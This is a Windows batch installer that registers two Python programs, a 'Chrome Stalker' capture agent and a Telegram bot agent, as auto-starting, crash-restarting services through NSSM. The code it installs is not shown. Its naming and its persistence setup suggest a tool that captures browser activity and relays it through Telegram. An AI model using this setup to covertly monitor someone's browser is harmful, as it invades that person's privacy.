@echo off
:: nssm_install.bat — Install chrome_stalker services via NSSM
:: Run once (with Administrator privileges) to register both services.
:: Download NSSM from https://nssm.cc and add it to PATH, or place nssm.exe
:: in this directory before running.
::
:: Usage:
::   nssm_install.bat
::
:: Services created:
::   ChromeStalker  — capture agent  (stalker.py)
::   ChromeTBot     — Telegram bot   (tBotAgent.py)

setlocal EnableDelayedExpansion
cd /d "%~dp0"
set "BASE=%~dp0"

:: ── Require Administrator ──────────────────────────────────────────────────
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERROR] Please run this script as Administrator.
    pause
    exit /b 1
)

:: ── Resolve NSSM ──────────────────────────────────────────────────────────
where nssm >nul 2>&1
if %errorlevel% neq 0 (
    if exist "%BASE%nssm.exe" (
        set "NSSM=%BASE%nssm.exe"
    ) else (
        echo [ERROR] nssm.exe not found.
        echo         Download from https://nssm.cc and place it in this directory
        echo         or add it to your PATH.
        pause
        exit /b 1
    )
) else (
    set "NSSM=nssm"
)

:: ── Resolve Python ────────────────────────────────────────────────────────
:: Use plain python (not pythonw) so NSSM can capture stdout/stderr properly.
for /f "delims=" %%i in ('where python 2^>nul') do (
    if not defined PYTHON set "PYTHON=%%i"
)
if not defined PYTHON (
    echo [ERROR] python not found in PATH.
    pause
    exit /b 1
)
echo [INFO] Using Python: %PYTHON%

:: ── Create log directory ──────────────────────────────────────────────────
if not exist "%BASE%logs" mkdir "%BASE%logs"

:: ══════════════════════════════════════════════════════════════════════════
:: Service: ChromeStalker
:: ══════════════════════════════════════════════════════════════════════════
echo.
echo [INFO] Installing ChromeStalker...

%NSSM% install ChromeStalker "%PYTHON%" "%BASE%stalker.py"
%NSSM% set ChromeStalker AppDirectory "%BASE%"
%NSSM% set ChromeStalker AppStdout    "%BASE%logs\stalker.log"
%NSSM% set ChromeStalker AppStderr    "%BASE%logs\stalker.err.log"
:: Disposition 4 = OPEN_ALWAYS (append)
%NSSM% set ChromeStalker AppStdoutCreationDisposition 4
%NSSM% set ChromeStalker AppStderrCreationDisposition 4
:: Restart 3 s after crash
%NSSM% set ChromeStalker AppRestartDelay 3000
%NSSM% set ChromeStalker AppThrottle   5000
%NSSM% set ChromeStalker Description  "Chrome Stalker — capture agent"
%NSSM% set ChromeStalker Start        SERVICE_AUTO_START

:: ══════════════════════════════════════════════════════════════════════════
:: Service: ChromeTBot
:: ══════════════════════════════════════════════════════════════════════════
echo.
echo [INFO] Installing ChromeTBot...

%NSSM% install ChromeTBot "%PYTHON%" "%BASE%tBotAgent.py"
%NSSM% set ChromeTBot AppDirectory "%BASE%"
%NSSM% set ChromeTBot AppStdout    "%BASE%logs\tbot.log"
%NSSM% set ChromeTBot AppStderr    "%BASE%logs\tbot.err.log"
%NSSM% set ChromeTBot AppStdoutCreationDisposition 4
%NSSM% set ChromeTBot AppStderrCreationDisposition 4
%NSSM% set ChromeTBot AppRestartDelay 3000
%NSSM% set ChromeTBot AppThrottle   5000
%NSSM% set ChromeTBot Description  "Chrome Stalker — Telegram bot agent"
%NSSM% set ChromeTBot Start        SERVICE_AUTO_START

echo.
echo [OK] Both services installed successfully.
echo      Run start.bat to start them, or reboot to let them auto-start.
pause
